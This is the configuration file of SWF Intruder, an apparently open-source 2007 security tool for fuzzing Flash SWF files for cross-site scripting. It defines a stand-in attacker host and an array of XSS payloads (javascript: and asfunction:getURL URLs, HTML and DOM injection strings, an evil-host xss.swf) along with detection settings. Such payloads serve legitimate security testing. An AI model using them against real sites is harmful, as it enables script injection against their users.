/*************************************************
** Config.js
** Global Variables
**
**  This file is part of SWF Intruder
**  Author: Stefano Di Paola (stefano.dipaola@mindedsecurity.com)
**  Copyright: Minded Security © 2007
**  License: GPL 2.0
**
*/

var evilsite="http://at.tack.er/";


/************
**  Attack Patterns.
**  If you want to include the name of the fuzzed parameter somewhere,
**  use |NAME|.
*/
// var attackVector=['asfunction:getURL,javascript:gotRoot("|NAME|")///d.jpg', // Direct load 
// 		 // the '!' char is used to separate the affected parameter in gotRoot function
// 		  evilsite+'xss.swf?!|NAME|',  // controlled Evil Page
// 		  evilsite, // Controlled evil Host
// 		  "\x22\x27><img src='asfunction:getURL,javascript:gotRoot(\x22|NAME|\x22)//.jpg\x27 >dss", // Flash Html Injection
// 		  "(gotRoot(\x22|NAME|\x22))", // Dom Injection
// 		  "\x22\x27|!$%&/)=" // js/flash error
// 		  ];
var attackVector=['javascript:gotRoot("|NAME|")///img.jpg', // Direct load 
		 // the '!' char is used to separate the affected parameter in gotRoot function
		  evilsite+'xss.swf?!|NAME|',  // controlled Evil Page
		  evilsite, // Controlled evil Host
		  "\x22\x27><img src=\x22javascript:gotRoot('|NAME|')//img.jpg\x22 >dss", // Flash Html Injection
		  "(gotRoot(\x22|NAME|\x22))", // Dom Injection
		  "\x22\x27|!$%&/)=" // js/flash error
		  ];

var seconds=6000; // Time to wait for SWF to be loaded while testing for XSS.
var alertWhenFound=true; // if true popup an alert box when Xss is found
var miniSwf=true; // improve detection of Xss by using direct embed for swf
var showXssDiv=true; // improve detection of Xss by using direct embed for swf
var showDebugDiv=false; // improve detection of Xss by using direct embed for swf
var maxHistoryElements=3;
